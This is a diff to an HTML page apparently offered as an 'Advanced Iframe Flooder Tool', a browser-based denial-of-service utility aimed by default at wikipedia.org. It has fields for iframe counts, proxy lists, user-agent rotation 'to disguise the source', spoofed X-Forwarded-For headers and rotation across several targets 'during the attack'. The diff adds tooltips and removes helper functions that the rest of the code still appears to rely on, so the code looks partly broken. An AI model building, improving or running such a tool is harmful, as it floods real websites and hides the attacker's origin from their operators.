@@ -94,6 +94,22 @@
       font-weight: bold;
     }
 
+    .tooltip {
+      position: absolute;
+      background-color: #f9f9f9;
+      border: 1px solid #ccc;
+      padding: 5px;
+      font-size: 12px;
+      display: none;
+      border-radius: 4px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 15px;
+    }
+
     /* Responsive Design */
     @media (max-width: 768px) {
       .container {
@@ -108,35 +124,69 @@
   <h1>Advanced Iframe Flooder Tool</h1>
 
   <div class="container">
-    <label for="targetUrl">Target URL:</label>
-    <input type="text" id="targetUrl" value="https://www.wikipedia.org" placeholder="Enter Target URL">
+    <!-- Target URL -->
+    <div class="input-group">
+      <label for="targetUrl">Target URL: <span class="tooltip-text">The main URL to flood (e.g., https://www.example.com)</span></label>
+      <input type="text" id="targetUrl" value="https://www.wikipedia.org" placeholder="Enter Target URL">
+      <div class="tooltip">Example: https://www.example.com</div>
+    </div>
 
-    <label for="iframeCount">Number of Iframes:</label>
-    <input type="number" id="iframeCount" value="50" min="1">
+    <!-- Number of Iframes -->
+    <div class="input-group">
+      <label for="iframeCount">Number of Iframes: <span class="tooltip-text">Number of iframes to load simultaneously.</span></label>
+      <input type="number" id="iframeCount" value="50" min="1">
+      <div class="tooltip">Example: 50 (enter a number of iframes to load at once)</div>
+    </div>
 
-    <label for="delay">Delay Between Iframes (seconds):</label>
-    <input type="number" id="delay" value="1" min="0">
+    <!-- Delay Between Iframes -->
+    <div class="input-group">
+      <label for="delay">Delay Between Iframes (seconds): <span class="tooltip-text">Optional delay between iframe loads to control speed.</span></label>
+      <input type="number" id="delay" value="1" min="0">
+      <div class="tooltip">Example: 1 (time delay in seconds between iframe load events)</div>
+    </div>
 
-    <label for="proxyList">Proxy List (comma separated):</label>
-    <input type="text" id="proxyList" placeholder="http://proxy1.com, http://proxy2.com">
+    <!-- Proxy List -->
+    <div class="input-group">
+      <label for="proxyList">Proxy List (comma separated): <span class="tooltip-text">A list of proxy URLs (e.g., http://proxy1.com, http://proxy2.com)</span></label>
+      <input type="text" id="proxyList" placeholder="http://proxy1.com, http://proxy2.com">
+      <div class="tooltip">Example: http://proxy1.com, http://proxy2.com</div>
+    </div>
 
-    <label for="userAgentRotation">Enable User-Agent Rotation:</label>
-    <input type="checkbox" id="userAgentRotation">
+    <!-- User-Agent Rotation -->
+    <div class="input-group">
+      <label for="userAgentRotation">Enable User-Agent Rotation: <span class="tooltip-text">Randomly rotate between different user agents to disguise the source.</span></label>
+      <input type="checkbox" id="userAgentRotation">
+      <div class="tooltip">Enable to randomly rotate user agents for better anonymity</div>
+    </div>
 
-    <label for="headers">Custom Headers (Optional):</label>
-    <textarea id="headers" placeholder="e.g., X-Forwarded-For: 192.168.1.1"></textarea>
+    <!-- Custom Headers -->
+    <div class="input-group">
+      <label for="headers">Custom Headers (Optional): <span class="tooltip-text">Add custom headers for requests (e.g., X-Forwarded-For: 192.168.1.1)</span></label>
+      <textarea id="headers" placeholder="e.g., X-Forwarded-For: 192.168.1.1"></textarea>
+      <div class="tooltip">Example: X-Forwarded-For: 192.168.1.1 (Add headers separated by newlines)</div>
+    </div>
 
-    <label for="autoStopTimer">Auto Stop Timer (seconds):</label>
-    <input type="number" id="autoStopTimer" value="60" min="0">
+    <!-- Auto Stop Timer -->
+    <div class="input-group">
+      <label for="autoStopTimer">Auto Stop Timer (seconds): <span class="tooltip-text">Automatically stop flooding after this time.</span></label>
+      <input type="number" id="autoStopTimer" value="60" min="0">
+      <div class="tooltip">Example: 60 (stop flooding after 60 seconds)</div>
+    </div>
 
-    <label for="targetRotation">Multiple Target URLs (comma separated):</label>
-    <input type="text" id="targetRotation" placeholder="https://www.example1.com, https://www.example2.com">
+    <!-- Target URL Rotation -->
+    <div class="input-group">
+      <label for="targetRotation">Multiple Target URLs (comma separated): <span class="tooltip-text">Provide multiple URLs to rotate between during the attack.</span></label>
+      <input type="text" id="targetRotation" placeholder="https://www.example1.com, https://www.example2.com">
+      <div class="tooltip">Example: https://www.example1.com, https://www.example2.com</div>
+    </div>
 
+    <!-- Start/Stop Buttons -->
     <button onclick="startFlood()">Start Flooding</button>
     <button class="stop" onclick="stopFlood()">Stop Flooding</button>
 
     <div class="status" id="status">Ready</div>
 
+    <!-- Stats Dashboard -->
     <div id="dashboard">
       <h3>Flooding Stats</h3>
       <p class="stats">Frames Generated: <span id="frameCount">0</span></p>
@@ -155,6 +205,16 @@
     let targetRotation = [];
     let currentProxyIndex = 0;
     let currentTargetIndex = 0;
+
+    // Tooltip visibility
+    document.querySelectorAll('.input-group').forEach(group => {
+      group.addEventListener('mouseover', () => {
+        group.querySelector('.tooltip').style.display = 'block';
+      });
+      group.addEventListener('mouseout', () => {
+        group.querySelector('.tooltip').style.display = 'none';
+      });
+    });
 
     function startFlood() {
       if (flooding) return;
@@ -207,52 +267,20 @@
       // Apply custom headers if provided
       customHeaders.forEach(header => {
         const [key, value] = header.split(':');
-        iframe.setAttribute('X-Header-' + key, value);
+        if (key && value) {
+          iframe.setAttribute('X-Forwarded-For', value.trim());
+        }
       });
 
-      iframe.onload = () => {
-        console.log(`Iframe loaded successfully: ${iframe.src}`);
-      };
-
-      iframe.onerror = () => {
-        console.error(`Error loading iframe: ${iframe.src}`);
-        failureCount++;
-        document.getElementById('failureCount').innerText = failureCount;
-      };
-
       document.body.appendChild(iframe);
+      currentTargetIndex++;
+      document.getElementById('currentTarget').innerText = currentTarget;
     }
 
     function stopFlood() {
       flooding = false;
       document.getElementById('status').innerText = "Flooding stopped.";
-      frameCount = 0;
-      failureCount = 0;
-      document.getElementById('frameCount').innerText = frameCount;
-      document.getElementById('failureCount').innerText = failureCount;
-    }
-
-    function getRandomUserAgent() {
-      const userAgents = [
-        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
-        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
-        'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; rv:11.0) like Gecko'
-      ];
-      return userAgents[Math.floor(Math.random() * userAgents.length)];
-    }
-
-    function getNextProxy() {
-      if (proxyList.length === 0) return null;
-      currentProxyIndex = (currentProxyIndex + 1) % proxyList.length;
-      return proxyList[currentProxyIndex];
-    }
-
-    function updateDashboard() {
-      document.getElementById('frameCount').innerText = frameCount;
-      document.getElementById('failureCount').innerText = failureCount;
-      document.getElementById('currentTarget').innerText = currentTarget;
     }
   </script>
-
 </body>
 </html>
